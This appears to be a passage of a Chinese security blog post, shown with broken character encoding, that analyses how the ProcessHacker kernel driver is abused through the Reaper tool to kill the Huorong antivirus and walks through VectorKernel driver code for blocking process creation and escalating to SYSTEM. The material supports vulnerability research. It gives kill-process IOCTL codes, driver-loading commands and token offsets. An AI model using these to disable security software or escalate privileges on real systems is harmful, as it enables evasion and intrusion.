<p>åœ¨<code>kprocesshacker</code>å’Œ<code>ntdll!ZwTerminateProcess</code>å¤„ä¸‹æ–­ç‚¹ï¼Œå½“ä½¿ç”¨ProcessHackerç»“æŸè¿›ç¨‹æ—¶ï¼ŒæˆåŠŸæ–­åœ¨<code>ZwTerminateProcess</code>å‡½æ•°è°ƒç”¨å¤„
<img alt="" src="../../images/Snipaste_2023-12-13_16-58-32.jpg" /></p>
<p>æ²¡æœ‰ç¬¦å·è¡¨ï¼Œéœ€è¦é™æ€åˆ†æå‡ºå‡½æ•°çš„ä½ç½®ï¼Œæ‰¾å‡ºé©±åŠ¨ä¸­å‡½æ•°åç§»é‡.
ç”±äºæˆ‘æ²¡æœ‰æ‰¾åˆ°2.8.0.0ç‰ˆæœ¬é©±åŠ¨çš„ProcessHackerçš„æ–‡ä»¶ï¼Œç”¨çš„æ˜¯å…¶ä»–ç‰ˆæœ¬è¿›è¡Œè°ƒè¯•ã€‚
å½“æˆ‘å°è¯•ç”¨å…¶ä»–ç‰ˆæœ¬çš„exeåŠ è½½2.8.0.0çš„sysæ–‡ä»¶æ—¶ï¼Œè™½ç„¶exeå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œä½†æ˜¯ç»è¿‡è°ƒè¯•åå‘ç°sysæ–‡ä»¶ä¼¼ä¹æ²¡æœ‰è¢«æ­£ç¡®è°ƒç”¨ï¼Œå› ä¸ºProcessHackerç”¨çš„è‡ªå·±è€Œä¸æ˜¯é©±åŠ¨æ¥è°ƒç”¨ZwTerminateProcessã€‚çœ‹æ¥exeå’Œsysæ˜¯é…å¯¹çš„
<img alt="" src="../../images/Snipaste_2023-12-13_20-34-06.jpg" /></p>
<p>ä¸‹æ–­ç‚¹<code>bp kprocesshacker+0x68f1</code>
<img alt="" src="../../images/Snipaste_2023-12-13_20-31-35.jpg" /></p>
<p>æ¥æ‰¾ä¸€ä¸‹<code>kprocesshacker.sys</code>ç»“æŸè¿›ç¨‹çš„å†…æ ¸çº§åˆ«å‡½æ•°<code>ZwTerminateProcess</code></p>
<p>æœç´¢<code>ZwTerminateProcess</code>å¯ä»¥çœ‹åˆ°è¢«å‡½æ•°<code>FUN_00017e78</code>è°ƒç”¨äº†ï¼Œé‚£ä¹ˆ<code>FUN_00017e78</code>æ˜¯ä¸æ˜¯é€ æˆæ¼æ´çš„ä¸»è¦åŸå› å‘¢
<img alt="" src="../../images/Snipaste_2023-12-13_15-36-08.jpg" />
åœ¨çœ‹<code>FUN_00017e78</code>çš„åæ±‡ç¼–ä¹‹å‰å…ˆçœ‹çœ‹<code>ZwTerminateProcess</code>å‡½æ•°åŸå‹</p>
<p><code>ZwTerminateProcess</code>æ¥å—2ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯è¿›ç¨‹çš„å¥æŸ„ï¼Œç¬¬äºŒä¸ªæ˜¯è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ã€‚ç®€å•ç²—æš´</p>
<pre><code class="language-C">NTSTATUS ZwTerminateProcess(
  _In_ HANDLE ProcessHandle,
  _In_ NTSTATUS ExitStatus
);
</code></pre>
<p>å¦‚æœæ˜¯ç»“æŸè¿›ç¨‹å¯ä»¥è¢«æ§åˆ¶ï¼Œé‚£æƒ³å¿…ç¬¬ä¸€ä¸ªå‚æ•°<code>ProcessHandle</code>è‚¯å®šå¯ä»¥è¢«æ§åˆ¶ã€‚</p>
<p><code>FUN_00017e78</code>å‡½æ•°åæ±‡ç¼–å¦‚ä¸‹</p>
<p><img alt="" src="../../images/Snipaste_2023-12-13_16-03-26.jpg" /></p>
<pre><code class="language-C">ulonglong FUN_00017e78(undefined8 param_1,undefined4 param_2,undefined param_3)

{
  longlong lVar1;
  uint uVar2;
  ulonglong uVar3;
  longlong lVar4;
  code *pcVar5;
  longlong local_res20;
  ulonglong uVar6;
  undefined8 local_18 [2];

  uVar6 = 0;
  uVar3 = ObReferenceObjectByHandle
                    (param_1,0,*(undefined8 *)PsProcessType_exref,param_3,&amp;local_res20,0);
  if ((int)uVar3 &lt; 0) {
    return uVar3;
  }
  lVar4 = IoGetCurrentProcess();
  lVar1 = local_res20;
  if (local_res20 == lVar4) {
    uVar3 = 0xc00000db;
  }
  else {
    if ((DAT_00014334 == 0) &amp;&amp; (pcVar5 = (code *)FUN_00011bac(&amp;DAT_000141c0), pcVar5 != (code *)0x0)
       ) {
      uVar2 = (*pcVar5)(lVar1,param_2);
      uVar3 = (ulonglong)uVar2;
      if (uVar2 != 0xc00000bb) goto LAB_00017f58;
    }
    uVar2 = ObOpenObjectByPointer
                      (local_res20,0x200,0,1,*(undefined8 *)PsProcessType_exref,
                       uVar6 &amp; 0xffffffffffffff00,local_18);
    uVar3 = (ulonglong)uVar2;
    if (-1 &lt; (int)uVar2) {
      uVar2 = ZwTerminateProcess(local_18[0],param_2);
      uVar3 = (ulonglong)uVar2;
      ZwClose(local_18[0]);
    }
  }
LAB_00017f58:
  ObfDereferenceObject(local_res20);
  return uVar3;
}
</code></pre>
<p>ä»£ç è¯»å¾—å¤´æ˜è„‘èƒ€ï¼Ÿæ²¡å…³ç³»ï¼Œè¿™ç§äº‹æƒ…å¯ä»¥äº¤ç»™GPTã€‚</p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œ<code>FUN_00017e78</code>å°†ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥äº†<code>ObReferenceObjectByHandle</code>ï¼Œè¯¥å‡½æ•°æ˜¯æ‰“å¼€è¿›ç¨‹å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¥æŸ„ã€‚<code>ObReferenceObjectByHandle</code>å°†è¿”å›çš„å¥æŸ„å­˜åˆ°äº†<code>local_18</code>æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚è€Œ<code>ZwTerminateProcess</code>æ¥å—<code>local_18</code>çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä½œä¸ºç»“æŸçš„è¿›ç¨‹å¥æŸ„ä¼ å…¥ã€‚</p>
<p>æ‰€ä»¥åªéœ€è¦æ§åˆ¶<code>FUN_00017e78</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±å¯ä»¥åˆ©ç”¨é©±åŠ¨ç›´æ¥ç»“æŸè¿›ç¨‹ã€‚</p>
<p>çŸ¥é“äº†æ¼æ´åŸå› ï¼Œå†æ¥çœ‹çœ‹åˆ©ç”¨å·¥å…·æ˜¯æ€ä¹ˆå®ç°çš„ã€‚</p>
<h4 id="_43">åˆ©ç”¨å·¥å…·åˆ†æ</h4>
<p>https://github.com/MrEmpy/Reaper
å·¥å…·å‡ ä¸ªå‡½æ•°å¦‚å›¾
ä¸»è¦åŠŸèƒ½å‡½æ•°åŒ…æ‹¬åŠ è½½é©±åŠ¨ã€å¸è½½é©±åŠ¨ã€æš‚åœè¿›ç¨‹ã€ç»“æŸè¿›ç¨‹ã€‚
<img alt="" src="../../images/Snipaste_2023-12-13_16-05-39.jpg" /></p>
<p>æ¥è¯•ä¸€ä¸‹å·¥å…·çš„æ•ˆæœå§ï¼
å¦‚ä¸‹å›¾æ€äº†ç«ç»’2ä¸ªè¿›ç¨‹ï¼Œç«ç»’å·²ç»è¢«æ€æ²¡äº†ã€‚
<img alt="" src="../../images/Snipaste_2023-12-13_21-40-45.jpg" />
è¿™ä¸ªå·¥å…·æ¯æ¬¡ç»“æŸä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šåœæ­¢é©±åŠ¨ï¼Œç«ç»’å­˜åœ¨å¤šä¸ªè¿›ç¨‹ï¼Œè‹¥è¦å®æˆ˜éœ€è¦æ”¹ä¸€ä¸‹ç¨‹åºã€‚
æ€»è€Œè¨€ä¹‹ï¼Œè¿™æ˜¯å¯ä»¥æ­£ç¡®åœ°æ€æ­»ç«ç»’çš„ã€‚</p>
<p>æ¥ç”¨windbgè·Ÿä¸€ä¸‹ã€‚
é¦–å…ˆåœ¨2.8.0.0ç‰ˆæœ¬çš„sysæ‰¾åˆ°å‡½æ•°åç§»é‡
<img alt="" src="../../images/Snipaste_2023-12-13_21-44-20.jpg" />
ä¸‹æ–­ç‚¹
<img alt="" src="../../images/Snipaste_2023-12-13_21-45-39.jpg" /></p>
<p>æ‰§è¡ŒreaperæˆåŠŸåœ¨å‡½æ•°å¤„æ–­ä¸‹,rcxæ˜¯è¿›ç¨‹å¥æŸ„ï¼Œrdxæ˜¯é€€å‡ºçŠ¶æ€
<img alt="" src="../../images/Snipaste_2023-12-13_21-53-41.jpg" /></p>
<p>è¿™ä¸ªå·¥å…·é¦–å…ˆä½¿ç”¨<code>DeployDriver</code>åŠ è½½sysé©±åŠ¨å¹¶è®¾ç½®å¯¹è±¡è·¯å¾„<code>\\.\KProcessHacker2</code>, ç„¶åé€šè¿‡æŒ‡å®šçš„PIDä½¿ç”¨<code>OpenProcess</code>è·å–è¦æ“ä½œçš„è¿›ç¨‹å¥æŸ„ã€‚
è€Œæœ€æ ¸å¿ƒçš„åœ¨äºè¿™ä¸¤è¡Œç›¸åº”åŠŸèƒ½çš„<code>IOCTL</code>ç¼–å·ï¼Œè¿™ä¹Ÿæ˜¯æ¼æ´å­˜åœ¨çš„ç‚¹</p>
<pre><code>#define IOCTL_CODE_KILLPROCESS 0x999920df
#define IOCTL_CODE_SUSPENDPROC 0x999920d7
</code></pre>
<p>æ¥ç€é€šè¿‡<code>DeviceIoControl</code>å‡½æ•°æ“ä½œé©±åŠ¨å¯¹è±¡ï¼Œå¾€ç›¸åº”çš„<code>IOCTL</code>å‘é€äº†<code>ioInput</code>ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“åŒ…å«è¿›ç¨‹å¥æŸ„å’Œé€€å‡ºçŠ¶æ€ã€‚ä¹Ÿæ­£æ˜¯<code>ZwTerminateProcess</code>æ‰€æ¥æ”¶çš„å‚æ•°ã€‚</p>
<p>æœ€ååˆ©ç”¨é©±åŠ¨çš„åŠŸèƒ½ï¼Œæ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚</p>
<h4 id="_44">å°¾å£°</h4>
<p>å…³äºæ¼æ´ç‚¹ï¼Œä¹Ÿå°±æ˜¯<code>IOCTL</code>ç¼–å·ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥ç ”ç©¶ã€‚</p>
<h3 id="vectorkernel">VectorKernelå·¥å…·å­¦ä¹ </h3>
<p>äº’è”ç½‘å†²æµªæ—¶å‘ç°çš„ä¸€ä¸ªé¡¹ç›®ï¼Œä½œè€…å†™äº†å«å¤šä¸ªè‡ªå®šä¹‰åŠŸèƒ½çš„sysé©±åŠ¨ï¼Œå¹¶ç”¨C#ç¨‹åºè°ƒç”¨é©±åŠ¨ã€‚
æ¥çœ‹çœ‹è¿™ä¸ªå·¥å…·ã€‚
é¡¹ç›®åœ°å€ https://github.com/daem0nc0re/VectorKernel</p>
<h4 id="blocknewproc">BlockNewProc</h4>
<p>é˜»æ­¢åˆ›å»ºæ–°è¿›ç¨‹</p>
<p>å…ˆåˆ›å»ºä¸€ä¸ªé©±åŠ¨æœåŠ¡</p>
<pre><code>sc create BlockNewProc binPath= C:\Users\admin\Desktop\VectorKernel\BlockNewProcClient type= kernel
</code></pre>
<p>ç¦ç”¨äº†<code>notepad.exe</code>ï¼Œnotepadå·²ç»ä¸èƒ½å¯åŠ¨äº†
<img alt="" src="../../images/Snipaste_2023-12-14_14-27-59.jpg" />
å–æ¶ˆç¦ç”¨ï¼Œåˆå¯ä»¥å¯åŠ¨äº†
<img alt="" src="../../images/Snipaste_2023-12-14_14-29-36.jpg" /></p>
<p>çœ‹çœ‹sysä»£ç æ˜¯æ€ä¹ˆå®ç°çš„ã€‚</p>
<p>é©±åŠ¨ä¸»å‡½æ•°<code>DriverEntry</code>ã€‚</p>
<pre><code class="language-C">NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{

    //å„ç§åˆå§‹åŒ–ï¼Œä»…æ”¯æŒ64ä½ç³»ç»Ÿ
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;
    PDEVICE_OBJECT pDeviceObject = nullptr;

#ifndef _WIN64
    KdPrint((DRIVER_PREFIX &quot;32bit OS is not supported.\n&quot;));
    return STATUS_NOT_SUPPORTED;
#endif

    do
    {
        UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH);
        UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);

    //äº’æ–¥é”
        ::ExInitializeFastMutex(&amp;g_FastMutex);

    //åˆ›å»ºé©±åŠ¨
        ntstatus = ::IoCreateDevice(
            DriverObject,
            NULL,
            &amp;devicePath,
            FILE_DEVICE_UNKNOWN,
            NULL,
            FALSE,
            &amp;pDeviceObject);


        if (!NT_SUCCESS(ntstatus))
        {
            pDeviceObject = nullptr;
            KdPrint((DRIVER_PREFIX &quot;Failed to create device (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
            break;
        }

    //åˆ›å»ºç¬¦å·é“¾æ¥
        ntstatus = ::IoCreateSymbolicLink(&amp;symlinkPath, &amp;devicePath);

        if (!NT_SUCCESS(ntstatus))
        {
            KdPrint((DRIVER_PREFIX &quot;Failed to create symbolic link (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
            break;
        }

    //é©±åŠ¨æ³¨å†Œ
    //è®¾ç½®majoråŠŸèƒ½å¤„ç†ç¨‹åºã€‚
    //major åŠŸèƒ½å¤„ç†ç¨‹åºæ˜¯é©±åŠ¨ç¨‹åºå¤„ç† IRP è¯·æ±‚çš„å‡½æ•°ã€‚IRPè¯·æ±‚éœ€è¦ç”¨åˆ°è¿™ä¸ªå‡½æ•°ã€‚
    // I/O è¯·æ±‚æœ‰ä¸åŒçš„ç±»å‹ï¼Œæ¯ä¸ªç±»å‹éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ major åŠŸèƒ½

    //å°†é©±åŠ¨å¸è½½ç¨‹åºè®¾ç½®ä¸ºDriverUnloadå‡½æ•°
        DriverObject-&gt;DriverUnload = DriverUnload; 

    //è®¾ç½®åˆ›å»ºè®¾å¤‡çš„IRPè¯·æ±‚å‡½æ•°ä¸ºOnCreateClose
        DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
    //è®¾ç½®å…³é—­è®¾å¤‡çš„IRPè¯·æ±‚å‡½æ•°ä¸ºOnCreateClose
        DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
    //è®¾ç½®å¤„ç†è®¾å¤‡æ§åˆ¶çš„IRPè¯·æ±‚å‡½æ•°ä¸ºOnDeviceControl
        DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;

        KdPrint((DRIVER_PREFIX &quot;Driver is loaded successfully.\n&quot;));
    } while (false);

    if (!NT_SUCCESS(ntstatus) &amp;&amp; (pDeviceObject != nullptr))
        ::IoDeleteDevice(pDeviceObject);

    return ntstatus;
}
</code></pre>
<p>é©±åŠ¨å¸è½½ç¨‹åºå‡½æ•°<code>DriverUnload</code></p>
<pre><code class="language-C">void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);
    ::IoDeleteSymbolicLink(&amp;symlinkPath);   //åˆ é™¤ç¬¦å·é“¾æ¥
    ::IoDeleteDevice(DriverObject-&gt;DeviceObject);  //åˆ é™¤è®¾å¤‡å¯¹è±¡

    //å¦‚æœå­˜åœ¨Callbackå‡½æ•°ï¼Œåˆ™æ³¨é”€
    if (g_CallbackRegistered)
    {
        ::PsSetCreateProcessNotifyRoutineEx2(
            PsCreateProcessNotifySubsystems,
            (PVOID)ProcessBlockRoutine,
            TRUE);
    }

    KdPrint((DRIVER_PREFIX &quot;Driver is unloaded.\n&quot;));
}
</code></pre>
<p>åˆ›å»ºå’Œå…³é—­è®¾å¤‡å‡½æ•°<code>OnCreateClose</code>ã€‚
ä½œç”¨æ˜¯è®¾ç½®çŠ¶æ€</p>
<pre><code class="language-C">NTSTATUS OnCreateClose(
    _Inout_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    NTSTATUS ntstatus = STATUS_SUCCESS;
    Irp-&gt;IoStatus.Status = ntstatus;
    Irp-&gt;IoStatus.Information = 0u;
    IoCompleteRequest(Irp, 0);

    return ntstatus;
}
</code></pre>
<p>æ§åˆ¶å‡½æ•°</p>
<pre><code class="language-C">NTSTATUS OnDeviceControl(
    _Inout_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST;
    PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp);
    auto&amp; dic = irpSp-&gt;Parameters.DeviceIoControl;
    ULONG_PTR info = NULL;

    switch (dic.IoControlCode)
    {
    //IOCTL_SET_PROCESS_FILENAMEæ˜¯è¿›åˆ¶åˆ›å»ºç›¸åº”è¿›ç¨‹çš„ä»£ç 
    case IOCTL_SET_PROCESS_FILENAME:
        if (dic.InputBufferLength &lt; sizeof(BLOCK_FILENAME_INFO))
        {
            ntstatus = STATUS_BUFFER_TOO_SMALL;
            break;
        }

    //è·å–äº’æ–¥é”
        ::ExAcquireFastMutex(&amp;g_FastMutex);
    //è¿™é‡Œè·å–ä¼ å…¥çš„æ–‡ä»¶åä¿å­˜åˆ°g_ImageFileNameSuffix[]
        ::memset(g_ImageFileNameSuffix, 0, sizeof(WCHAR) * 258);
        g_ImageFileNameSuffix[0] = L'\\';
        ::memcpy(&amp;g_ImageFileNameSuffix[1], Irp-&gt;AssociatedIrp.SystemBuffer, sizeof(BLOCK_FILENAME_INFO));
        g_ImageFileNameSuffix[257] = L'\0';

        KdPrint((DRIVER_PREFIX &quot;Target ImageFileName pattern is updated to \&quot;%ws\&quot;.\n&quot;, &amp;g_ImageFileNameSuffix));

    //æ³¨å†Œcallbackå‡½æ•°PsSetCreateProcessNotifyRoutineEx2ï¼Œæ‰§è¡ŒProcessBlockRoutineé”è¿›ç¨‹åˆ›å»ºçš„å‡½æ•°
        if (!g_CallbackRegistered)
        {
            ntstatus = ::PsSetCreateProcessNotifyRoutineEx2(
                PsCreateProcessNotifySubsystems,
                (PVOID)ProcessBlockRoutine,
                FALSE);

            if (!NT_SUCCESS(ntstatus))
            {
                KdPrint((DRIVER_PREFIX &quot;Failed to register Process Notify Routine (NTSTATUS = 0x%08X).&quot;, ntstatus));
                break;
            }
            else
            {
                g_CallbackRegistered = TRUE;
                KdPrint((DRIVER_PREFIX &quot;Process Notify Callback is registered successfully.\n&quot;));
            }
        }

    //é‡Šæ”¾äº’æ–¥é”
        ::ExReleaseFastMutex(&amp;g_FastMutex);

        info = ::wcslen(g_ImageFileNameSuffix) * sizeof(WCHAR);
        ntstatus = STATUS_SUCCESS;

        break;

    //IOCTL_UNREGISTER_CALLBACKåˆ†æ”¯æ˜¯é‡Šæ”¾å›è°ƒå‡½æ•°
    case IOCTL_UNREGISTER_CALLBACK:
        ::ExAcquireFastMutex(&amp;g_FastMutex);

        if (g_CallbackRegistered)
        {
            ::memset(g_ImageFileNameSuffix, 0, sizeof(WCHAR) * 258);
            ntstatus = ::PsSetCreateProcessNotifyRoutineEx2(
                PsCreateProcessNotifySubsystems,
                (PVOID)ProcessBlockRoutine,
                TRUE);

            if (!NT_SUCCESS(ntstatus))
            {
                KdPrint((DRIVER_PREFIX &quot;Failed to unregister Process Notify Callback (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
            }
            else
            {
                g_CallbackRegistered = FALSE;
                KdPrint((DRIVER_PREFIX &quot;Process Notify Callback is unregistered successfully.\n&quot;));
            }
        }
        else
        {
            KdPrint((DRIVER_PREFIX &quot;Process Notify Callback is not registered.\n&quot;));
        }

        ::ExReleaseFastMutex(&amp;g_FastMutex);
    }

    //å®ŒæˆIRPè¯·æ±‚
    Irp-&gt;IoStatus.Status = ntstatus;
    Irp-&gt;IoStatus.Information = info;
    IoCompleteRequest(Irp, 0);

    return ntstatus;
}
</code></pre>
<p>è¿™æ ·çœ‹æ¥æ˜¯é€šè¿‡è®¾ç½®äº†ä¸€ä¸ªæ§åˆ¶çš„å›è°ƒå‡½æ•°æ¥å®ç°ç¦æ­¢è¿›ç¨‹åˆ›å»ºçš„ã€‚</p>
<p><code>ProcessBlockRoutine</code>å‡½æ•°</p>
<p>å®ç°åŠŸèƒ½é€»è¾‘å°±æ˜¯
<code>CreateInfo-&gt;CreationStatus = STATUS_ACCESS_DENIED</code>
å°†<code>CreateInfo</code>çš„<code>CreationStatus</code>è®¾ç½®ä¸º<code>STATUS_ACCESS_DENIED</code></p>
<pre><code class="language-C">void ProcessBlockRoutine(
    _Inout_ PEPROCESS Process,
    _In_ HANDLE ProcessId,
    _Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(ProcessId);

    if (CreateInfo != nullptr)
    {
        ::ExAcquireFastMutex(&amp;g_FastMutex);

        if (::wcslen(g_ImageFileNameSuffix) &gt; 0)
        {
            UNICODE_STRING suffix{ 0 };
            ::RtlInitUnicodeString(&amp;suffix, g_ImageFileNameSuffix);

            if (::RtlSuffixUnicodeString(&amp;suffix, (PUNICODE_STRING)CreateInfo-&gt;ImageFileName, TRUE))
            {
                CreateInfo-&gt;CreationStatus = STATUS_ACCESS_DENIED;
                KdPrint((DRIVER_PREFIX &quot;Blocked Process: %wZ\n&quot;, (PUNICODE_STRING)CreateInfo-&gt;ImageFileName));
            }
            else
            {
                KdPrint((DRIVER_PREFIX &quot;Allowed Process: %wZ\n&quot;, (PUNICODE_STRING)CreateInfo-&gt;ImageFileName));
            }
        }
        else
        {
            KdPrint((DRIVER_PREFIX &quot;Allowed Process: %wZ\n&quot;, (PUNICODE_STRING)CreateInfo-&gt;ImageFileName));
        }

        ::ExReleaseFastMutex(&amp;g_FastMutex);
    }
}
</code></pre>
<p><code>CreateInfo</code>ç»“æ„ä½“</p>
<pre><code class="language-c">typedef struct _PPS_CREATE_NOTIFY_INFO
{
    UNICODE_STRING ImageFileName;  //æˆå‘˜åŒ…å«æ–°è¿›ç¨‹çš„æ˜ åƒæ–‡ä»¶åã€‚è¯¥æˆå‘˜æ˜¯ä¸€ä¸ª `UNICODE_STRING` ç»“æ„ï¼ŒåŒ…å«æ–‡ä»¶åçš„å­—ç¬¦ä¸²å’Œé•¿åº¦

    UNICODE_STRING ProcessName;   //æˆå‘˜åŒ…å«æ–°è¿›ç¨‹çš„ä¸»æ¨¡å—åã€‚è¯¥æˆå‘˜ä¹Ÿæ˜¯ä¸€ä¸ª `UNICODE_STRING` ç»“æ„
    HANDLE ProcessId;       //æˆå‘˜åŒ…å«æ–°è¿›ç¨‹çš„å¥æŸ„ã€‚è¯¥æˆå‘˜æ˜¯ä¸€ä¸ª `HANDLE` ç±»å‹
    NTSTATUS CreationStatus;    //æˆå‘˜åŒ…å«æ–°è¿›ç¨‹çš„åˆ›å»ºçŠ¶æ€ã€‚è¯¥æˆå‘˜æ˜¯ä¸€ä¸ª `NTSTATUS` ç±»å‹ã€‚
} PPS_CREATE_NOTIFY_INFO;    

</code></pre>
<p><code>CreationStatus</code>æ˜¯ä¸€ä¸ª<code>NTSTATUS</code>å€¼ï¼Œå°†å€¼å®šä¹‰æˆé”™è¯¯ç±»å‹çš„å€¼å°±å¯ä»¥é˜»æ­¢è¿›ç¨‹åˆ›å»ºã€‚
å¾®è½¯å®šä¹‰çš„æ‰€æœ‰<code>NTSTATUS</code>å€¼å¯åœ¨<code>ntstatus.h</code>æ‰¾åˆ°ã€‚
ç”±äºå®šä¹‰çš„æ˜¯<code>STATUS_ACCESS_DENIED</code>ï¼Œæ‰€ä»¥ç³»ç»Ÿå‡ºç°çš„æ‹’ç»è®¿é—®å¼¹çª—ï¼Œæ”¹æˆå…¶ä»–çŠ¶æ€åˆä¼šæ˜¯å¦ä¸€ç§å¼¹çª—æˆ–æ˜¯æ— å¼¹çª—ã€‚
ä½†è¿™äº›éƒ½ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯é”™è¯¯çŠ¶æ€é˜»æ­¢äº†è¿›ç¨‹çš„åˆ›å»ºã€‚</p>
<p><img alt="" src="../../images/Snipaste_2023-12-14_15-35-45.jpg" /></p>
<p>ç”¨windbgè°ƒè¯•ä¸€ä¸‹é©±åŠ¨ï¼Œåœ¨<code>BlockNewProcDrv_x64</code>é©±åŠ¨ä¸­å¯æ‰¾åˆ°<code>_PPS_CREATE_NOTIFY_INFO</code>ç»“æ„ä½“
<img alt="" src="../../images/Snipaste_2023-12-14_16-13-31.jpg" /></p>
<p>åœ¨<code>ProcessBlockRoutine</code>å‡½æ•°è°ƒç”¨å‰ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å½“å‰ä¼ å…¥çš„å˜é‡
<img alt="" src="../../images/Snipaste_2023-12-14_16-44-27.jpg" /></p>
<h4 id="getfullprivs">GetFullPrivs</h4>
<p>è¿™ä¸ªåŠŸèƒ½å¯ä»¥ææƒåˆ°<code>system</code></p>
<p>æ·»åŠ æœåŠ¡</p>
<pre><code>sc create GetFullPrivs binPath= C:\Users\admin\Desktop\GetFullPrivsDrv.sys type= kernel
sc start GetFullPrivs
</code></pre>
<p>ä»¥<code>system</code>å¼€å¯äº†<code>cmd</code>
<img alt="" src="../../images/Snipaste_2023-12-18_11-32-48.jpg" /></p>
<p>é‡å¤çš„åŠ è½½é©±åŠ¨å¸è½½é©±åŠ¨å°±ä¸çœ‹äº†ï¼Œç›´æ¥çœ‹çœ‹åŠŸèƒ½ä¸åŒçš„åœ°æ–¹ã€‚</p>
<p>åˆå§‹åŒ–</p>
<pre><code class="language-C">    do
    {
        RTL_OSVERSIONINFOW versionInfo{ 0 };
        UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH);
        UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);

        ntstatus = ::RtlGetVersion(&amp;versionInfo);   //ä½¿ç”¨RtlGetVersionè·å–ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ï¼Œç»“æœè¿”å›ç»™versionInfoç»“æ„ä½“

        if (!NT_SUCCESS(ntstatus))      //ç‰ˆæœ¬è·å–å¤±è´¥çš„å¤„ç†
        {
            KdPrint((DRIVER_PREFIX &quot;Failed to get OS version information (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
            break;
        }
        else           //è·å–æˆåŠŸæ‰“å°è·å–çš„ç‰ˆæœ¬ä¿¡æ¯
        {
            KdPrint((DRIVER_PREFIX &quot;OS Version - %u.%u.%u\n&quot;,
                versionInfo.dwMajorVersion,
                versionInfo.dwMinorVersion,
                versionInfo.dwBuildNumber));

            // _SEP_TOKEN_PRIVILEGES was introduced since Windows Vista
            //æ ¹æ®ä¸åŒç³»ç»Ÿç‰ˆæœ¬ç‰ˆæœ¬è®¾å®šå€¼
            //https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw

            if ((versionInfo.dwMajorVersion == 6))   
            {
                if (versionInfo.dwMinorVersion &lt; 2)
                {
                    // From Windows Vista to Windows 7 SP1
                    g_PrivilegesOffset = 0x40u;
                    g_UserAndGroupCountOffset = 0x78u;
                    g_UserAndGroupsOffset = 0x90u;
                    g_TokenFlagsOffset = 0xC0u;
                    g_IntegrityLevelIndexOffset = 0xC8u;
                }
                else
                {
                    // From Windows 8 to Windows 8.1
                    g_PrivilegesOffset = 0x40u;
                    g_UserAndGroupCountOffset = 0x7Cu;
                    g_UserAndGroupsOffset = 0x98u;
                    g_TokenFlagsOffset = 0xC8u;
                    g_IntegrityLevelIndexOffset = 0xD0u;
                }
            }
            else if (versionInfo.dwMajorVersion == 10)
            {
                // From Windows 10 1509 to Windows 11 23H2
                g_PrivilegesOffset = 0x40u;
                g_UserAndGroupCountOffset = 0x7Cu;
                g_UserAndGroupsOffset = 0x98u;
                g_TokenFlagsOffset = 0xC8u;
                g_IntegrityLevelIndexOffset = 0xD0u;
            }
            else
            {
                // Older than Windows Vista does not have _SEP_TOKEN_PRIVILEGE
                ntstatus = STATUS_NOT_SUPPORTED;
                KdPrint((DRIVER_PREFIX &quot;Unsupported OS version is detected.\n&quot;));
                break;
            }

        }

        ntstatus = ::IoCreateDevice(
            DriverObject,
            NULL,
            &amp;devicePath,
            FILE_DEVICE_UNKNOWN,
            NULL,
            FALSE,
            &amp;pDeviceObject);

        if (!NT_SUCCESS(ntstatus))
        {
            pDeviceObject = nullptr;
            KdPrint((DRIVER_PREFIX &quot;Failed to create device (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
            break;
        }

        //ç¬¦å·åˆ›å»ºæˆåŠŸæ—¶
        ntstatus = ::IoCreateSymbolicLink(&amp;symlinkPath, &amp;devicePath);

        if (!NT_SUCCESS(ntstatus))
        {
            KdPrint((DRIVER_PREFIX &quot;Failed to create symbolic link (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
            break;
        }
        //è®¾å®šé©±åŠ¨çš„å„ç§æ“ä½œå‡½æ•°
        DriverObject-&gt;DriverUnload = DriverUnload;
        DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
